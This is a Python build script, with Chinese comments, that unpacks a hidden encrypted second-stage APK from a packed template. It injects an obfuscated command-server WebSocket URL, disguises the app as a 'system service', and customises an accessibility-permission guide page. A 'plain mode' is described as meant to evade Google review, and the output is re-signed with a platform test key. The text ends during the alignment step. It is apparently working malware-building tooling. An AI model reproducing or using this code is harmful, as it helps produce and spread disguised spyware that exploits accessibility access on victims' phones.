#!/usr/bin/env python3
"""
B包独立构建器 - 从加固版 APK 中提取 B包，注入配置，输出为独立可安装 APK。

支持与 build_apk_v2 copy.py 完全一致的前端参数：
  --server    WebSocket 服务器地址
  --web       WebView 网页地址
  --name      应用显示名称
  --icon      应用图标 PNG 路径
  --bg        背景图路径
  --config    完整 pageStyleConfig JSON

流程:
  1. 读取外壳 APK → 修复伪加密 → 解密 nx0M
  2. 提取 B包 (pd13e5ae2/p26ee723a)
  3. 修改 0.bt 配置 (serverUrl, webUrl, ENC 加密)
  4. 替换图标、背景图、应用名 (ARSC/AXML/svc_config.html)
  5. 重建 ZIP → 重签名 → 输出可安装 APK

参考: build_apk_v2 copy.py
"""
import sys, os, io, re, json, argparse, zipfile, shutil, struct, hashlib, zlib, subprocess, random, string

import functools as _ft
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
print = _ft.partial(print, flush=True)

# ====================== 常量 ======================
NX0M_KEY_STR = "nx0M2"
NX0M_AES_KEY = hashlib.sha1(NX0M_KEY_STR.encode()).digest()[:16]
NX0M_AES_IV = hashlib.sha256(NX0M_KEY_STR.encode()).digest()[:16]

# ENC 加解密密钥 (B包 smali v81.a0)
_N01_KEY1 = bytes([0x4b,0x72,0x5a,0x38,0x6e,0x51,0x79,0x34,0x58,0x6d,0x32,0x57,0x70,0x37,0x4c,0x76])
_N01_KEY2 = bytes([0x39,0x46,0x74,0x4a,0x68,0x33,0x52,0x63,0x35,0x47,0x64,0x30,0x59,0x62,0x6e,0x58])


def _enc_encrypt(plaintext: str) -> str:
    """n01 加密: XOR key1 -> XOR key2 -> swap pairs -> Base64"""
    import base64 as _b64
    data = plaintext.encode('utf-8')
    n = len(data)
    r1 = bytearray(n)
    for i in range(n): r1[i] = (data[i] ^ _N01_KEY1[i % 16]) & 0xff
    r2 = bytearray(n)
    for i in range(n): r2[i] = (r1[i] ^ _N01_KEY2[i % 16]) & 0xff
    for i in range(0, n - 1, 2): r2[i], r2[i+1] = r2[i+1], r2[i]
    return 'ENC:' + _b64.b64encode(bytes(r2)).decode()


def _enc_decrypt(enc_str: str) -> str:
    """n01 解密: Base64 -> swap pairs -> XOR key2 -> XOR key1"""
    import base64 as _b64
    if not enc_str.startswith('ENC:'):
        return enc_str
    raw = _b64.b64decode(enc_str[4:])
    n = len(raw)
    r2 = bytearray(raw)
    for i in range(0, n - 1, 2): r2[i], r2[i+1] = r2[i+1], r2[i]
    r1 = bytearray(n)
    for i in range(n): r1[i] = (r2[i] ^ _N01_KEY2[i % 16]) & 0xff
    data = bytearray(n)
    for i in range(n): data[i] = (r1[i] ^ _N01_KEY1[i % 16]) & 0xff
    return bytes(data).decode('utf-8')


# ====================== ZIP 伪加密 ======================

def fix_fake_encryption(data: bytearray) -> int:
    """清除 ZIP 中所有条目的加密标志位"""
    count = 0
    pos = 0
    while pos < len(data) - 4:
        sig = bytes(data[pos:pos+4])
        if sig == b'PK\x03\x04':
            flags = struct.unpack_from('<H', data, pos + 6)[0]
            if flags & 0x01:
                struct.pack_into('<H', data, pos + 6, flags & ~0x01)
                count += 1
            pos += 30
        elif sig == b'PK\x01\x02':
            flags = struct.unpack_from('<H', data, pos + 8)[0]
            if flags & 0x01:
                struct.pack_into('<H', data, pos + 8, flags & ~0x01)
                count += 1
            pos += 46
        else:
            pos += 1
    return count


def extract_from_cd(apk_data: bytes, filename: str) -> bytes:
    """通过 Central Directory 绕过伪加密提取文件"""
    eocd_pos = apk_data.rfind(b'PK\x05\x06')
    if eocd_pos == -1:
        raise ValueError("找不到 EOCD")
    cd_entries = struct.unpack_from('<H', apk_data, eocd_pos + 10)[0]
    cd_offset = struct.unpack_from('<I', apk_data, eocd_pos + 16)[0]
    pos = cd_offset
    for _ in range(cd_entries):
        sig = struct.unpack_from('<I', apk_data, pos)[0]
        if sig != 0x02014b50: break
        method = struct.unpack_from('<H', apk_data, pos + 10)[0]
        comp_size = struct.unpack_from('<I', apk_data, pos + 20)[0]
        uncomp_size = struct.unpack_from('<I', apk_data, pos + 24)[0]
        name_len = struct.unpack_from('<H', apk_data, pos + 28)[0]
        extra_len = struct.unpack_from('<H', apk_data, pos + 30)[0]
        comment_len = struct.unpack_from('<H', apk_data, pos + 32)[0]
        local_offset = struct.unpack_from('<I', apk_data, pos + 42)[0]
        name = apk_data[pos+46:pos+46+name_len].decode('utf-8', errors='replace')
        if name == filename:
            lh_name_len = struct.unpack_from('<H', apk_data, local_offset + 26)[0]
            lh_extra_len = struct.unpack_from('<H', apk_data, local_offset + 28)[0]
            data_off = local_offset + 30 + lh_name_len + lh_extra_len
            if comp_size == 0 and uncomp_size > 0: comp_size = uncomp_size
            if method == 0: return apk_data[data_off:data_off + uncomp_size]
            elif method == 8: return zlib.decompress(apk_data[data_off:data_off + comp_size], -15)
            else: return apk_data[data_off:data_off + uncomp_size]
        pos += 46 + name_len + extra_len + comment_len
    raise FileNotFoundError(f"在 APK 中未找到 {filename}")


# ====================== AES 解密 ======================

def decrypt_nx0m(encrypted: bytes) -> bytes:
    """AES/CBC/PKCS5Padding 解密 nx0M"""
    from Crypto.Cipher import AES
    cipher = AES.new(NX0M_AES_KEY, AES.MODE_CBC, NX0M_AES_IV)
    decrypted = cipher.decrypt(encrypted)
    pad = decrypted[-1]
    if 1 <= pad <= 16 and all(b == pad for b in decrypted[-pad:]):
        decrypted = decrypted[:-pad]
    return decrypted


# ====================== ZM26 加解密 ======================

def zm26_make_keystream(xor_key: bytes, salt: bytes, length: int) -> bytes:
    """生成 ZM26 密钥流 (周期 24)"""
    base = xor_key + salt
    return bytes(base[i % 24] for i in range(length))


def zm26_decrypt(data: bytes, xor_key: bytes, salt: bytes) -> bytes:
    """ZM26 解密"""
    encrypted = data[20:]
    ks = zm26_make_keystream(xor_key, salt, len(encrypted))
    return bytes(a ^ b for a, b in zip(encrypted, ks))


def zm26_encrypt(plaintext: bytes, header_20: bytes, xor_key: bytes, salt: bytes) -> bytes:
    """ZM26 加密"""
    ks = zm26_make_keystream(xor_key, salt, len(plaintext))
    cipher = bytes(a ^ b for a, b in zip(plaintext, ks))
    return header_20 + cipher


# ====================== ARSC 应用名替换 ======================

def _decode_len(data, offset):
    val = data[offset]
    if (val & 0x80) != 0:
        val2 = data[offset + 1]
        return ((val & 0x7F) << 8) | val2, 2
    return val, 1

def _encode_len(l):
    if l < 128: return bytes([l])
    return bytes([0x80 | ((l >> 8) & 0x7F), l & 0xFF])


def _rebuild_arsc_stringpool(arsc_data: bytes, new_str: str) -> bytes:
    """重建 ARSC StringPool，替换 パルス 相关应用名"""
    try:
        chunk_type, header_size, total_size, package_count = struct.unpack_from('<HHII', arsc_data, 0)
        sp_offset = header_size
        sp_type, sp_header_size, sp_size, string_count, style_count, flags, strings_start, styles_start = struct.unpack_from('<HHIIIIII', arsc_data, sp_offset)
        
        is_utf8 = bool(flags & 0x100)
        if not is_utf8:
            # UTF-16 StringPool
            old_variants = ['パルス', 'パルスス', 'パ\u200cル\u200cス']
            new_u16 = new_str.encode('utf-16-le')
            replaced = 0
            result = bytearray(arsc_data)
            for old_name in old_variants:
                old_u16 = old_name.encode('utf-16-le')
                old_with_prefix = struct.pack('<H', len(old_name)) + old_u16 + b'\x00\x00'
                new_with_prefix = struct.pack('<H', len(new_str)) + new_u16 + b'\x00\x00'
                if old_with_prefix in result:
                    cnt = bytes(result).count(old_with_prefix)
                    result = bytearray(bytes(result).replace(old_with_prefix, new_with_prefix))
                    replaced += cnt
            if replaced > 0:
                size_diff = (len(new_str) - 5) * 2 * replaced
                new_sp_size = sp_size + size_diff
                struct.pack_into('<I', result, sp_offset + 4, new_sp_size)
                new_total = total_size + size_diff
                struct.pack_into('<I', result, 4, new_total)
                print(f'      [OK] ARSC UTF-16 替换成功 ({replaced}处)')
                return bytes(result)
            return arsc_data
        
        # UTF-8 StringPool
        offsets = []
        for i in range(string_count):
            off = struct.unpack_from('<I', arsc_data, sp_offset + sp_header_size + i * 4)[0]
            offsets.append(off)
        
        strings_data_start = sp_offset + strings_start
        string_bytes_list = []
        for i in range(string_count):
            start = strings_data_start + offsets[i]
            char_len, char_len_bytes = _decode_len(arsc_data, start)
            byte_len, byte_len_bytes = _decode_len(arsc_data, start + char_len_bytes)
            str_offset = start + char_len_bytes + byte_len_bytes
            s_bytes = arsc_data[str_offset : str_offset + byte_len]
            string_bytes_list.append(s_bytes)
        
        replaced_count = 0
        new_bytes = new_str.encode('utf-8')
        for i, s in enumerate(string_bytes_list):
            try:
                s_str = s.decode('utf-8')
                if s_str in ('パルス', 'パルスス'):
                    string_bytes_list[i] = new_bytes
                    replaced_count += 1
                elif len(s_str) >= 3 and 'パ' in s_str and 'ル' in s_str and 'ス' in s_str:
                    string_bytes_list[i] = new_bytes
                    replaced_count += 1
            except: pass
        
        if replaced_count == 0:
            return arsc_data
        
        new_data = bytearray()
        new_offsets = []
        for s_bytes in string_bytes_list:
            new_offsets.append(len(new_data))
            char_len = len(s_bytes.decode('utf-8', errors='ignore'))
            byte_len = len(s_bytes)
            new_data.extend(_encode_len(char_len))
            new_data.extend(_encode_len(byte_len))
            new_data.extend(s_bytes)
            new_data.append(0)
        
        align_pad = (4 - (len(new_data) % 4)) % 4
        new_data.extend(b'\x00' * align_pad)
        
        new_sp_size = sp_header_size + len(new_offsets) * 4 + len(new_data)
        new_sp_bytes = bytearray(struct.pack('<HHIIIIII', sp_type, sp_header_size, new_sp_size,
                                             string_count, style_count, flags, strings_start, styles_start))
        for off in new_offsets:
            new_sp_bytes.extend(struct.pack('<I', off))
        new_sp_bytes.extend(new_data)
        
        original_rest = arsc_data[sp_offset + sp_size:]
        new_total_size = header_size + len(new_sp_bytes) + len(original_rest)
        new_arsc = bytearray(struct.pack('<HHII', chunk_type, header_size, new_total_size, package_count))
        new_arsc.extend(new_sp_bytes)
        new_arsc.extend(original_rest)
        
        print(f'      [OK] B包 ARSC 替换成功 ({replaced_count}处)')
        return bytes(new_arsc)
    except Exception as e:
        print(f'      [WARN] ARSC 重建失败: {e}')
        return arsc_data


# ====================== 自适应图标 ======================

def _make_adaptive_foreground(icon_path_or_data, size=512):
    """生成自适应图标前景图 - 全尺寸填充（无 padding）+ PNG 最大压缩"""
    try:
        from PIL import Image
        if isinstance(icon_path_or_data, bytes):
            img = Image.open(io.BytesIO(icon_path_or_data))
        else:
            img = Image.open(icon_path_or_data)
        img = img.convert('RGBA')
        img = img.resize((size, size), Image.Resampling.LANCZOS)
        out_buf = io.BytesIO()
        img.save(out_buf, format='PNG', optimize=True)
        return out_buf.getvalue()
    except Exception as e:
        print(f"      [WARN] 自适应前景图加工失败: {e}")
        if isinstance(icon_path_or_data, bytes):
            return icon_path_or_data
        with open(icon_path_or_data, 'rb') as f:
            return f.read()


def _resize_icon_png(icon_data, target_w, target_h):
    """将图标 PNG 缩放到目标尺寸并最大压缩"""
    try:
        from PIL import Image
        img = Image.open(io.BytesIO(icon_data)).convert('RGBA')
        if img.width != target_w or img.height != target_h:
            img = img.resize((target_w, target_h), Image.Resampling.LANCZOS)
        out_buf = io.BytesIO()
        img.save(out_buf, format='PNG', optimize=True)
        return out_buf.getvalue()
    except:
        return icon_data


# ====================== AndroidManifest AXML Patch ======================

def _patch_manifest_launcher(manifest_data: bytes) -> bytes:
    """
    修改二进制 AndroidManifest.xml (AXML)：
    1. 将 StringPool 中 android.intent.category.INFO 替换为 LAUNCHER
       (所有引用该字符串的 Activity 都会受影响)
    2. 将 TransparentHelperActivity 的 enabled 属性从 true(0xFFFFFFFF)
       改为 false(0x00000000)，使其不在桌面显示图标
    
    这样只有 .A1 alias 会显示为桌面入口。
    """
    OLD_STR = 'android.intent.category.INFO'
    NEW_STR = 'android.intent.category.LAUNCHER'
    DISABLE_ACTIVITY = 'TransparentHelperActivity'
    
    # 验证 AXML 格式
    if len(manifest_data) < 8:
        return manifest_data
    magic = struct.unpack_from('<I', manifest_data, 0)[0]
    if magic != 0x00080003:
        return manifest_data
    
    # 解析 StringPool chunk header
    sp_offset = 8
    sp_type = struct.unpack_from('<H', manifest_data, sp_offset)[0]
    if sp_type != 0x0001:
        return manifest_data
    
    sp_header_size = struct.unpack_from('<H', manifest_data, sp_offset + 2)[0]
    sp_chunk_size = struct.unpack_from('<I', manifest_data, sp_offset + 4)[0]
    string_count = struct.unpack_from('<I', manifest_data, sp_offset + 8)[0]
    style_count = struct.unpack_from('<I', manifest_data, sp_offset + 12)[0]
    flags = struct.unpack_from('<I', manifest_data, sp_offset + 16)[0]
    strings_start = struct.unpack_from('<I', manifest_data, sp_offset + 20)[0]
    styles_start = struct.unpack_from('<I', manifest_data, sp_offset + 24)[0]
    
    is_utf8 = bool(flags & 0x100)
    
    # 读取 string offsets
    offsets_start = sp_offset + sp_header_size
    offsets = []
    for i in range(string_count):
        offsets.append(struct.unpack_from('<I', manifest_data, offsets_start + i * 4)[0])
    
    # 解析字符串
    data_start = sp_offset + strings_start
    strings_list = []
    
    if is_utf8:
        for i in range(string_count):
            pos = data_start + offsets[i]
            cl = manifest_data[pos]
            if cl & 0x80: pos += 2
            else: pos += 1
            bl = manifest_data[pos]
            if bl & 0x80:
                bl = ((bl & 0x7F) << 8) | manifest_data[pos + 1]
                pos += 2
            else:
                pos += 1
            s = manifest_data[pos:pos+bl].decode('utf-8', errors='replace')
            strings_list.append(s)
    else:
        for i in range(string_count):
            pos = data_start + offsets[i]
            char_len = struct.unpack_from('<H', manifest_data, pos)[0]
            if char_len & 0x8000:
                char_len = ((char_len & 0x7FFF) << 16) | struct.unpack_from('<H', manifest_data, pos + 2)[0]
                pos += 4
            else:
                pos += 2
            s = manifest_data[pos:pos + char_len * 2].decode('utf-16-le', errors='replace')
            strings_list.append(s)
    
    # 查找并替换 INFO -> LAUNCHER
    replaced = False
    for i, s in enumerate(strings_list):
        if s == OLD_STR:
            strings_list[i] = NEW_STR
            replaced = True
    
    if not replaced:
        return manifest_data
    
    # 查找 TransparentHelperActivity 和 enabled 属性的 string index
    tha_index = -1
    enabled_res_id = 0x0101000e  # android:enabled 的 resource ID
    for i, s in enumerate(strings_list):
        if DISABLE_ACTIVITY in s:
            tha_index = i
            break
    
    # 重建 StringPool
    if is_utf8:
        new_data = bytearray()
        new_offsets = []
        for s in strings_list:
            new_offsets.append(len(new_data))
            s_bytes = s.encode('utf-8')
            char_len = len(s)
            byte_len = len(s_bytes)
            if char_len >= 128:
                new_data.append(0x80 | ((char_len >> 8) & 0x7F))
                new_data.append(char_len & 0xFF)
            else:
                new_data.append(char_len & 0x7F)
            if byte_len >= 128:
                new_data.append(0x80 | ((byte_len >> 8) & 0x7F))
                new_data.append(byte_len & 0xFF)
            else:
                new_data.append(byte_len & 0x7F)
            new_data.extend(s_bytes)
            new_data.append(0)
    else:
        new_data = bytearray()
        new_offsets = []
        for s in strings_list:
            new_offsets.append(len(new_data))
            s_u16 = s.encode('utf-16-le')
            char_len = len(s)
            new_data.extend(struct.pack('<H', char_len))
            new_data.extend(s_u16)
            new_data.extend(b'\x00\x00')
    
    # 4 字节对齐
    while len(new_data) % 4 != 0:
        new_data.append(0)
    
    # 重建 chunk
    new_strings_start = sp_header_size + string_count * 4
    if style_count > 0:
        new_strings_start += style_count * 4
    new_sp_size = new_strings_start + len(new_data)
    
    new_sp = bytearray()
    new_sp.extend(struct.pack('<HHIIIIII',
        sp_type, sp_header_size, new_sp_size,
        string_count, style_count, flags,
        new_strings_start, 0
    ))
    for off in new_offsets:
        new_sp.extend(struct.pack('<I', off))
    new_sp.extend(new_data)
    
    # 重组 AXML: file header + new StringPool + rest
    rest_data = bytearray(manifest_data[sp_offset + sp_chunk_size:])
    
    # 在 rest_data 中禁用 TransparentHelperActivity（避免桌面两个图标）
    if tha_index >= 0:
        tha_ref = struct.pack('<I', tha_index)
        bool_true = b'\x08\x00\x00\x12\xff\xff\xff\xff'
        bool_false = b'\x08\x00\x00\x12\x00\x00\x00\x00'
        
        search_pos = 0
        while True:
            found = rest_data.find(tha_ref, search_pos)
            if found == -1:
                break
            scan_start = found
            scan_end = min(found + 200, len(rest_data))
            epos = rest_data.find(bool_true, scan_start, scan_end)
            if epos != -1:
                rest_data[epos:epos+8] = bool_false
                print(f'      [OK] TransparentHelperActivity: enabled=false')
                break
            search_pos = found + 4
    
    # extractNativeLibs: 不修改（保持原样，旧版本没有这个处理）
    
    new_file_size = 8 + len(new_sp) + len(rest_data)
    result = bytearray()
    result.extend(struct.pack('<II', magic, new_file_size))
    result.extend(new_sp)
    result.extend(rest_data)
    
    print(f'      [OK] AndroidManifest: INFO -> LAUNCHER')
    return bytes(result)


# ====================== 工具函数 ======================

def _find_build_tool(name):
    """在 PATH 和本地 Android SDK 中查找 build-tools 工具"""
    found = shutil.which(name)
    if found: return found
    sdk_dirs = []
    for env_key in ('ANDROID_HOME', 'ANDROID_SDK_ROOT', 'ANDROID_SDK'):
        v = os.environ.get(env_key)
        if v and os.path.isdir(v): sdk_dirs.append(v)
    for base in [os.path.expandvars(r'%LOCALAPPDATA%\Android\Sdk'),
                 r'D:\Develop\android-sdk', r'C:\Android\sdk',
                 os.path.expanduser('~/Android/Sdk'),
                 '/opt/android-sdk', '/usr/local/android-sdk']:
        if os.path.isdir(base) and base not in sdk_dirs: sdk_dirs.append(base)
    for sdk in sdk_dirs:
        bt = os.path.join(sdk, 'build-tools')
        if not os.path.isdir(bt): continue
        versions = sorted(os.listdir(bt), reverse=True)
        for ver in versions:
            for ext in ('.bat', '.exe', ''):
                candidate = os.path.join(bt, ver, name + ext)
                if os.path.isfile(candidate): return candidate
    return None


# ====================== 主逻辑 ======================

def build_b_pack(template_path: str, output_path: str, server_url: str,
                 web_url: str = '', app_name: str = '', package_name: str = '',
                 icon_path: str = '', bg_path: str = '', server_config_extra: dict = None,
                 plain_mode: bool = False):
    """
    从加固版 APK 中提取 B包，注入全部配置，输出独立可安装 APK。
    参数与 build_apk_v2 copy.py 的 repack_apk() 完全一致。
    """
    sc_extra = server_config_extra or {}
    
    if not web_url:
        web_url = server_url.replace('wss://', 'https://').replace('ws://', 'http://')
    if not app_name:
        app_name = '系统服务'
    
    print(f'\n{"="*60}')
    print(f'  B包独立构建器')
    print(f'{"="*60}')
    print(f'  Server:  {server_url}')
    print(f'  Web:     {web_url}')
    print(f'  Name:    {app_name}')
    print(f'  Icon:    {icon_path or "(无)"}')
    print(f'  BG:      {bg_path or "(无)"}')
    print(f'  Mode:    {"明文（不加密，过谷歌）" if plain_mode else "加密"}')
    print()
    
    # ============ Step 1: 读取并解密 ============
    print('  [1/6] 读取模板 APK 并解密载荷...')
    with open(template_path, 'rb') as f:
        apk_data = bytearray(f.read())
    print(f'    模板: {len(apk_data)/1024/1024:.1f} MB')
    
    fix_fake_encryption(apk_data)
    nx0m_data = extract_from_cd(bytes(apk_data), 'assets/nx0M')
    payload_zip = decrypt_nx0m(nx0m_data)
    print(f'    载荷解密完成: {len(payload_zip)/1024/1024:.1f} MB')
    
    # ============ Step 2: 提取 B包 ============
    print('  [2/6] 提取 B包...')
    payload_zf = zipfile.ZipFile(io.BytesIO(payload_zip))
    
    b_pack_name = None
    b_pack_data = None
    for info in payload_zf.infolist():
        if info.filename.startswith('p') and info.file_size > 1000000:
            b_pack_name = info.filename
            b_pack_data = payload_zf.read(info.filename)
            break
    
    if not b_pack_data:
        print('    [ERROR] 未找到 B包!')
        sys.exit(1)
    
    print(f'    B包: {b_pack_name} ({len(b_pack_data)/1024/1024:.1f} MB)')
    
    # 修复伪加密
    b_mutable = bytearray(b_pack_data)
    fix_fake_encryption(b_mutable)
    b_pack_data = bytes(b_mutable)
    
    # ============ Step 3: 修改 0.bt 配置 ============
    print('  [3/6] 注入 0.bt 配置...')
    try:
        b_zf = zipfile.ZipFile(io.BytesIO(b_pack_data))
        zm26_meta = json.loads(b_zf.read('assets/zm26_meta.json'))
        xor_key = bytes.fromhex(zm26_meta['xor_key'])
        salt = bytes.fromhex(zm26_meta['salt'])
        
        raw_0bt = b_zf.read('assets/0.bt')
        header_20 = raw_0bt[:20]
        plaintext = zm26_decrypt(raw_0bt, xor_key, salt)
        cfg = json.loads(plaintext.decode('utf-8'))
        
        print(f'    原始 serverUrl: {_enc_decrypt(cfg.get("serverUrl",""))[:50]}')
        
        if plain_mode:
            # 明文模式：不加密（用于过谷歌）
            cfg['serverUrl'] = server_url
            cfg['webUrl'] = web_url
        else:
            # 注入 ENC 加密的 serverUrl 和 webUrl（APP 要求 ENC: 格式，明文会 fallback 硬编码地址）
            cfg['serverUrl'] = _enc_encrypt(server_url)
            cfg['webUrl'] = _enc_encrypt(web_url)
        
        # 合并 sc_extra 配置
        if sc_extra:
            for k, v in sc_extra.items():
                if k == 'pageStyleConfig' and isinstance(v, dict):
                    if 'pageStyleConfig' not in cfg or not isinstance(cfg['pageStyleConfig'], dict):
                        cfg['pageStyleConfig'] = {}
                    cfg['pageStyleConfig'].update(v)
                else:
                    cfg[k] = v
        
        # 写入 appName
        if app_name:
            if 'pageStyleConfig' not in cfg or not isinstance(cfg['pageStyleConfig'], dict):
                cfg['pageStyleConfig'] = {}
            cfg['pageStyleConfig']['appName'] = app_name
            cfg['configMaskText'] = sc_extra.get('configMaskText', app_name)
            cfg['configMaskSubtitle'] = sc_extra.get('configMaskSubtitle', app_name)
        
        # 强制启用桌面图标（app 内部通过 setComponentEnabledSetting 实现）
        cfg['showAppIcon'] = True
        
        new_plaintext = json.dumps(cfg, ensure_ascii=False, separators=(',', ':')).encode('utf-8')
        if plain_mode:
            # 明文模式：0.bt 直接放纯 JSON（对应 classes_plain_b3.dex 空密钥，j.a0() 跳过解密）
            new_0bt = new_plaintext
        else:
            # 加密模式：ZM26 封装
            new_0bt = zm26_encrypt(new_plaintext, header_20, xor_key, salt)
        
        print(f'    新 serverUrl: {server_url}')
        print(f'    新 webUrl:    {web_url}')
        print(f'    Mode: {"明文（纯JSON，无加密）" if plain_mode else "加密（ZM26+ENC）"}')
        print(f'    0.bt: {len(raw_0bt)} -> {len(new_0bt)} bytes')
    except Exception as e:
        print(f'    [ERROR] 配置注入失败: {e}')
        import traceback; traceback.print_exc()
        new_0bt = None
    
    # ============ Step 4: 重建 B包 ZIP (替换图标/背景/应用名) ============
    print('  [4/6] 重建 B包 (图标/背景/应用名替换)...')
    
    icon_data = None
    adaptive_icon_data = None
    if icon_path and os.path.exists(icon_path):
        with open(icon_path, 'rb') as f:
            icon_data = f.read()
        adaptive_icon_data = _make_adaptive_foreground(icon_path, size=512)
    
    icon_count = 0
    b_zf = zipfile.ZipFile(io.BytesIO(b_pack_data))
    
    out_buf = io.BytesIO()
    with zipfile.ZipFile(out_buf, 'w') as zout:
        for info in b_zf.infolist():
            filename = info.filename
            
            # 跳过旧签名
            if filename.startswith('META-INF/'):
                continue
            
            try:
                data = b_zf.read(filename)
            except Exception:
                try:
                    data = extract_from_cd(b_pack_data, filename)
                except:
                    continue
            
            new_info = zipfile.ZipInfo(filename)
            new_info.date_time = info.date_time
            
            # 压缩方式（.so 也压缩，因为 manifest 已设 extractNativeLibs=true）
            if filename == 'resources.arsc':
                new_info.compress_type = zipfile.ZIP_STORED
            else:
                new_info.compress_type = zipfile.ZIP_DEFLATED
            
            # === 替换 0.bt ===
            if filename == 'assets/0.bt' and new_0bt is not None:
                data = new_0bt
                new_info.compress_type = zipfile.ZIP_STORED
            
            # === 明文模式：所有其他 .bt 文件也需要解密为纯文本 ===
            elif plain_mode and filename.startswith('assets/') and filename.endswith('.bt') and filename != 'assets/0.bt':
                try:
                    plaintext = zm26_decrypt(data, xor_key, salt)
                    data = plaintext
                    new_info.compress_type = zipfile.ZIP_STORED
                except Exception:
                    pass  # 如果解密失败保留原数据
            
            # === 替换 ARSC 应用名 ===
            elif filename == 'resources.arsc' and app_name:
                data = _rebuild_arsc_stringpool(data, app_name)
                # 背景色 #FFF4568C -> 纯白
                data = data.replace(b'\x8c\x56\xf4\xff', b'\xff\xff\xff\xff')
                new_info.compress_type = zipfile.ZIP_STORED
            
            # === 注入 svc_config.html (无障碍引导页) ===
            elif filename == 'assets/svc_config.html':
                html_text = data.decode('utf-8', errors='ignore')
                psc = sc_extra.get('pageStyleConfig', {}) if sc_extra else {}
                usage_ins = psc.get('usageInstructions', '')
                steps = [line.strip() for line in usage_ins.split('\n') if line.strip()] if usage_ins else []
                new_cfg = {
                    "btnColor": psc.get('buttonColor') or "#fe90a6",
                    "btnTextColor": psc.get('enableButtonTextColor') or "#FFFFFF",
                }
                if psc.get('appName') or app_name:
                    new_cfg["title"] = psc.get('appName', app_name)
                if psc.get('enableButtonText'):
                    new_cfg["btn"] = psc['enableButtonText']
                if steps:
                    new_cfg["steps"] = steps
                new_cfg_json = json.dumps(new_cfg, ensure_ascii=False)
                html_text = re.sub(r'var\s+SVC_CFG\s*=\s*\{.*?\};', f'var SVC_CFG = {new_cfg_json};', html_text)
                html_text = html_text.replace("var rawLang = '[LNG]';", "var rawLang = navigator.language || navigator.userLanguage || 'en';")
                data = html_text.encode('utf-8')
                print(f'      [OK] svc_config.html 注入成功')
                new_info.compress_type = zipfile.ZIP_DEFLATED
            
            # === 替换背景图 ===
            elif bg_path and os.path.exists(bg_path) and filename.endswith('.png') and (
                any(k in filename for k in ['bg_accessibility', 'app_loading_bg', 'bg_config_mask']) or
                filename in ('᪺/ͦᷰᷴ/᫈̏ᷬq᪺᷶o.png', '᷊/1᷶cQfx/M᷏ᫌ᫰᫓K.png')
            ):
                with open(bg_path, 'rb') as f:
                    data = f.read()
                print(f'      [OK] 替换背景: {filename}')
            
            # === 替换图标 ===
            elif icon_data and filename.endswith('.png'):
                if filename in ('assets/igj.png', 'assets/sjgj.png'):
                    data = icon_data
                    icon_count += 1
                elif adaptive_icon_data and (
                    ('Revm' in filename) or
                    ('Ui' in filename and filename.endswith('Ti.png')) or
                    ('pjB/' in filename) or
                    ('de35t' in filename) or
                    ('EU.png' in filename) or
                    ('UtA/' in filename) or
                    ('BG5J.png' in filename) or
                    ('VmX/' in filename and filename.endswith('w.png')) or
                    ('W/' in filename and len(filename) < 50) or
                    ('JQ/' in filename and filename.endswith('Ll.png'))
                ):
                    data = adaptive_icon_data
                    icon_count += 1
                else:
                    try:
                        if data[:8] == b'\x89PNG\r\n\x1a\n' and len(data) >= 24:
                            w = struct.unpack('>I', data[16:20])[0]
                            h = struct.unpack('>I', data[20:24])[0]
                            # 正方形 PNG 且尺寸 >= 48 就是图标
                            if w == h and w >= 48:
                                # 大尺寸用 adaptive foreground，小尺寸按目标尺寸缩放
                                if w >= 432 and adaptive_icon_data:
                                    data = adaptive_icon_data
                                else:
                                    data = _resize_icon_png(icon_data, w, h)
                                icon_count += 1
                    except: pass
            
            # === 替换 B包 classes.dex ===
            elif filename == 'classes.dex':
                # 明文模式用 plain_b3（空密钥+b3），加密模式用 b3_patched（完整密钥+b3）
                if plain_mode:
                    dex_name = 'classes_plain_b3.dex'
                else:
                    dex_name = 'classes_b3_patched.dex'
                patched_dex_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), dex_name)
                if os.path.exists(patched_dex_path):
                    with open(patched_dex_path, 'rb') as _pf:
                        data = _pf.read()
                    print(f'      [OK] classes.dex 已替换 ({dex_name})')
            
            # === 修改 AndroidManifest.xml: INFO -> LAUNCHER (桌面显示图标) ===
            elif filename == 'AndroidManifest.xml':
                data = _patch_manifest_launcher(data)
            
            zout.writestr(new_info, data)

            # === 明文模式: 同时写出原始名配置 (j.a0 在明文 dex 下按原始名读取) ===
            _plain_alias = {
                'assets/0.bt': 'assets/server_config.json',
                'assets/1.bt': 'assets/app_config.json',
                'assets/2.bt': 'assets/locateValues.json',
                'assets/3.bt': 'assets/monitor_config.json',
            }
            if plain_mode and filename in _plain_alias:
                alias_info = zipfile.ZipInfo(_plain_alias[filename])
                alias_info.compress_type = zipfile.ZIP_STORED
                zout.writestr(alias_info, data)
    
    if icon_count > 0:
        print(f'      [OK] 图标替换: {icon_count} 个')
    
    rebuilt_data = out_buf.getvalue()
    print(f'    重建后: {len(rebuilt_data)/1024/1024:.1f} MB')
    
    # ============ Step 5: 写入文件 ============
    print('  [5/6] 写入文件...')
    with open(output_path, 'wb') as f:
        f.write(rebuilt_data)
    
    # ============ Step 6: 重签名 ============
    print('  [6/6] 重签名...')
    apksigner = _find_build_tool('apksigner')
    if not apksigner:
        print('    [ERROR] 找不到 apksigner!')
        return
    
    # 查找 keystore
    script_dir = os.path.dirname(os.path.abspath(__file__))
    aosp_candidates = [
        '/opt/fisher-node/apk-builder/_aosp_testkey.p12',
        os.path.join(script_dir, '_aosp_testkey.p12'),
    ]
    keystore = next((k for k in aosp_candidates if os.path.exists(k)), None)
    ks_alias = 'platform'
    ks_type_args = ['--ks-type', 'pkcs12']
    
    if not keystore:
        debug_candidates = [
            '/opt/fisher-node/apk-builder/_debug.keystore',
            os.path.join(script_dir, '_debug.keystore'),
        ]
        keystore = next((k for k in debug_candidates if os.path.exists(k)), None)
        ks_alias = 'debugkey'
        ks_type_args = []
    
    if not keystore:
        # 自动生成 debug keystore
        keystore = os.path.join(script_dir, '_debug.keystore')
        keytool = _find_build_tool('keytool') or shutil.which('keytool')
        if keytool:
            subprocess.run([keytool, '-genkey', '-v', '-keystore', keystore,
                          '-alias', 'debugkey', '-keyalg', 'RSA', '-keysize', '2048',
                          '-validity', '10000', '-storepass', 'android',
                          '-keypass', 'android', '-dname', 'CN=Debug,O=Debug,C=US'],
                         capture_output=True)
        ks_alias = 'debugkey'
        ks_type_args = []
    
    # zipalign
    aligned = output_path + '.aligned'
    zipalign_bin = _find_build_tool('zipalign')
    if zipalign_bin:
        subprocess.run([zipalign_bin, '-f', '4', output_path, aligned], capture_output=True)
    else:
        shutil.copy2(output_path, aligned)
